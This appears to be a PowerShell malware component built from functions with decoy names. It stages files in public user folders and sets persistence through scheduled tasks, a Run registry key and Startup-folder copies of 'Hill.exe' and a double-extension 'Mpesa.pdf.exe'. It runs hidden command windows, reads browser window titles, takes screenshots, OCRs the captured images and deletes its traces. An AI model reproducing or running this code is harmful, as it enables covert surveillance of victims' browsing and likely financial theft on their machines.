
#Kym-Wines
#The-Loft
#Clarett-Lounge

$ocr = "H:\Hunter\softXX\v1\Tesseract-OCR"
New-Item -Path "C:\Users\Public\Windows" -ItemType Directory
$Pbc = "C:\Users\Public\Windows"
$Pbv = "C:\Users\Public\Videos"
Set-Location -Path $Pbc

#___________________________________________________

#$title = ""; $string = ""; $unique = ""; $png = ""; $Pbc = ""; $btc = ""; $brs = ""; $wshell = ""; $x = ""; $y = ""; $port = ""; $red = ""; $file = ""; $bounds = ""; $browser = ""; $port = "7777"; $Ipaddress = ""; $t = ""; $actvwnd = ""; $lhost = ""; $bit = ""; $blue = ""; $moonletFlorida = ""; $cx = ""; $cy = "";
#___________________________________________________

function Air-NewZealand
{
	#generate random ip
	Set-Location -Path $Pbc
	$btc = [IPAddress]::Parse([String] (Get-Random) )
	$btc > .\btc.txt
	$btc = [IO.File]::ReadAllText(".\btc.txt")
	$btc = $btc.Split('IPAddressToString : ')[-1]
	$btc = $btc.Trim()
	$btc > .\btc.txt
}

#___________________________________________________

function Ent-Ry
{
	if (!(Test-Path "$Pbv\control.txt"))
	{
		Set-Content -Path "$Pbv\control.txt" -Value '999'
		start-process "C:\Users\Public\Videos\gourmet.cmd" -windowstyle hidden
	}
	else
	{
		exit
	}
}

#___________________________________________________

function Ex-It
{
	Remove-Item "$Pbc\control.txt"
	Start-Sleep -s 600
	Import-Module "C:\Users\Public\Videos\TaylorSwift.ps1"

}

#___________________________________________________

function Air-Asia
{
	#process image text for unique string	
	$title = [IO.File]::ReadAllText("$file")
	$string = $title
	if ($string -like "*$unique*") 
	{
		echo GoodlifePharmacy!
	} 
	else
	{ 
		exit
	}
}

#___________________________________________________

function Abdul-Rahman
{
	$Lines = Get-Content $tr
	$OutputPath = $tn
	foreach ($Line in $Lines) 
	{
		$Line = $line.Insert(0,$tl)
		#$Line += ‘"’
		Write-Output $Line | Out-File $OutputPath -Append
	}
}

#$tr = ".\z2.ps1"; $tn = ".\z3.ps1"; $tl = 'Move-Item -path "'; Abdul-Rahman
#___________________________________________________

function Hush-Puppi
{
	$one;
	while ($one -ge 0)
	{
		$file
		Get-Content $file | Measure-Object -Line
		$a = (Get-Content $file | Measure-Object)
		(Get-Content $file) | ? {($a.count-0)-notcontains $_.ReadCount} | Set-Content $file
		$one--; 
	}
}

#$one = 2; $file = "$home\tokyo2.ps1"; Hush-Puppi

#___________________________________________________

function Lara-Cosm
{
	Remove-Item ".\tokyo.txt"
	Remove-Item ".\tokyo2.txt"
	Remove-Item ".\tokyo3.txt"
	Remove-Item ".\tokyo.ps1"
	Remove-Item ".\tokyo2.ps1"
	Remove-Item ".\tokyo3.ps1"
	Remove-Item ".\z1.ps1"
	Remove-Item ".\z2.ps1"
	Remove-Item ".\z3.ps1"
	Remove-Item ".\title.txt"
	Remove-Item ".\title2.txt"
	Remove-Item ".\H.ps1"
}

#___________________________________________________

function Maria-Carparas
{
	Remove-Item "$Pbc\title.txt"
	Remove-Item "$Pbc\title2.txt"

	Get-Process $prc |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt
	Get-Content "$Pbc\title.txt" | Select-Object -Skip 3 | Out-File "$Pbc\title2.txt"
	Remove-Item "$Pbc\title.txt"

	$title = [IO.File]::ReadAllText("$Pbc\title2.txt")
	$title = $title.Trim()
	$title > "$Pbc\title.txt"
	Remove-Item "$Pbc\title2.txt"
}

#___________________________________________________

function Mountain-Cereals
{
	Maria-Carparas
	$title = [IO.File]::ReadAllText("$Pbc\title.txt")

	Rename-Item "$Pbc\title.txt" "$Pbc\z1.ps1"
	Remove-Item "$Pbc\z3.ps1"

	$tr = "$Pbc\z1.ps1"; $tn = "$Pbc\z3.ps1"; $tl = '$wshell.AppActivate("'; Abdul-Rahman
	$ssx = (gc "$Pbc\z3.ps1") -replace '\S+$','$&")'; $ssx > "$Pbc\z3.ps1"
	Remove-Item "$Pbc\z1.ps1"
}

#___________________________________________________

function Mutha-Ngari
{
	$d=10;
	while ($d -ge 0)
	{
		Import-Module $peponi
		$d--;
	}
}

#___________________________________________________

function Aer-Lingus
{

	SCHTASKS    /Create /SC MINUTE /MO 3 /TN georgia /TR "C:\Users\Public\Windows\TaylorSwift.cmd" /f
	SCHTASKS    /Create /SC MINUTE /MO 3 /TN georgia /TR C:\Users\Public\Windows\TaylorSwift.cmd /f
}

#___________________________________________________

function Garuda-Indonesia
{
	Remove-Item "$Pbc\title.txt"

	$ProcessActive = Get-Process chrome -ErrorAction SilentlyContinue
	if($ProcessActive -eq $null) 
	{ 
		$ProcessActive = Get-Process firefox -ErrorAction SilentlyContinue
		if($ProcessActive -eq $null) 
		{
			$ProcessActive = Get-Process opera -ErrorAction SilentlyContinue
			if($ProcessActive -eq $null) 
			{
				exit
			}
			else
			{ 
				$brs = "opera"
				Get-Process opera |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
			}

		}
		else
		{
			$brs = "firefox"
			Get-Process firefox |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
		}
	} 
	else
	{ 
		$brs = "chrome"
		Get-Process chrome |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
	}

	Get-Content $Pbc\title.txt | Select-Object -Skip 3 | Out-File $Pbc\title2.txt
	Remove-Item $Pbc\title.txt
	$title = [IO.File]::ReadAllText("$Pbc\title2.txt")
	$title = $title.Trim()
	$title > $Pbc\title.txt
	Remove-Item $Pbc\title2.txt
}

#___________________________________________________

function Singapore-Airlines
{
	Set-Location -Path $Pbc
	Copy-Item $png -Destination $ocr
	Remove-Item $png
	Set-Location -Path $ocr
	Set-Content -Path $ocr\gmail3.cmd -Value "tesseract.exe url.png url.png"
	Add-Content -Path $ocr\gmail3.cmd -Value "tesseract.exe text.png text.png"
	Add-Content -Path $ocr\gmail3.cmd -Value "exit"
	start-process $ocr\gmail3.cmd -windowstyle hidden
	Start-Sleep -s 10
	Stop-process -Name cmd
}

#___________________________________________________

function Mage-Lo
{
	echo GoodlifePharmacy!
}

#___________________________________________________

function Braeside-Catering
{
	param(
	  [string]$Width,
	  [string]$Height,
	  [String]$FileName = "Screenshot"
	 
	)
	 
	function Take-Screenshot{
	[cmdletbinding()]
	param(
	 [Drawing.Rectangle]$bounds,
	 [string]$path
	)
		$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
		$graphics = [Drawing.Graphics]::FromImage($bmp)
		$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
		$bmp.Save($path)
		$graphics.Dispose()
		$bmp.Dispose()
	}
	 
	function Get-ScreenResolution {
		$Screens = [system.windows.forms.screen]::AllScreens
		foreach ($Screen in $Screens) {
			$DeviceName = $Screen.DeviceName
			$Width  = $Screen.Bounds.Width
			$Height  = $Screen.Bounds.Height
			$IsPrimary = $Screen.Primary
			$OutputObj = New-Object -TypeName PSobject
			$OutputObj | Add-Member -MemberType NoteProperty -Name DeviceName -Value $DeviceName
			$OutputObj | Add-Member -MemberType NoteProperty -Name Width -Value $Width
			$OutputObj | Add-Member -MemberType NoteProperty -Name Height -Value $Height
			$OutputObj | Add-Member -MemberType NoteProperty -Name IsPrimaryMonitor -Value $IsPrimary
			$OutputObj
		}
	}

	$datetime = (Get-Date).tostring("dd-MM-yyyy-hh-mm-ss")
	$FileName = "{0}-{1}" -f $FileName, $datetime
	$Filepath = join-path $env:temp $FileName
	 
	[void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
	[void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")

	if(!($width -and $height)) { 
		$screen = Get-ScreenResolution | ? {$_.IsPrimaryMonitor -eq $true}
		$Width = $screen.Width
		$Height = $screen.height
	}
	Mage-Lo
}

#___________________________________________________

function Aer-Linges
{
	Move-Item ".\Mpesa.pdf.exe" -Destination "$Pbc" -Force
	Move-Item ".\Hill.cmd" -Destination "$Pbc" -Force
	Move-Item ".\HillEyes.ps1" -Destination "$Pbc" -Force;

	SCHTASKS    /Create /SC MINUTE /MO 35 /TN georgia /TR "C:\Users\Public\Windows\Hill.exe" /f
	SCHTASKS    /Create /SC MINUTE /MO 35 /TN georgia /TR C:\Users\Public\Windows\Hill.exe /f

	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v cd5 /t REG_SZ /d "C:\Users\Public\Windows\Mpesa.pdf.exe" /f
	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v cd5 /t REG_SZ /d C:\Users\Public\Windows\Mpesa.pdf.exe /f

	if (!(Test-Path "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"))
	{
		New-Item -Path '$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' -ItemType Directory
		Copy-Item "$Pbc\Hill.exe" -Destination "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
	}
	else
	{
		Copy-Item ".\Hill.exe" -Destination "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
	}

	if (!(Test-Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"))
	{
		New-Item -Path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp' -ItemType Directory
		Copy-Item "$Pbc\Hill.exe" -Destination "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
	}
	else
	{
		Copy-Item ".\Hill.exe" -Destination "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
	}
}

#___________________________________________________

function Magenta-Coop
{

	cmd /c "dir /b > z1.ps1"

	$one = 0; $file = ".\z1.ps1"; Hush-Puppi
	$fileName = ".\z1.ps1"; $firstLine = Get-Content -Path $fileName -TotalCount 1; $firstLine > ".\z2.ps1"

	Remove-Item ".\z1.ps1"
	Remove-Item ".\z3.ps1"

	$tr = ".\z2.ps1"; $tn = ".\z3.ps1"; $tl = 'Set-Location -Path "'; Abdul-Rahman
	$ssx = (gc ".\z3.ps1") -replace '\S+$','$&"'; $ssx > ".\z3.ps1"

	Remove-Item ".\z2.ps1"
	Import-Module ".\z3.ps1"
	Lara-Cosm
}

#___________________________________________________

function Magenta-Stanchart
{
	Remove-Item "$Pbc\z1.ps1"
	Start-Sleep -s 1
	
	$pwd > "$Pbc\z1.ps1"
	Remove-Item "$Pbc\z2.ps1"

	Start-Sleep -s 1
	Get-Content "$Pbc\z1.ps1" | Select-Object -Skip 3 | Out-File "$Pbc\z2.ps1"
	
	Remove-Item "$Pbc\z1.ps1"
	Start-Sleep -s 1
	
	$global:tle = [IO.File]::ReadAllText("$Pbc\z2.ps1")
	$tle = $tle.Trim()
	
	$tle > "$Pbc\z1.ps1"
	Remove-Item "$Pbc\z2.ps1"
}

#___________________________________________________








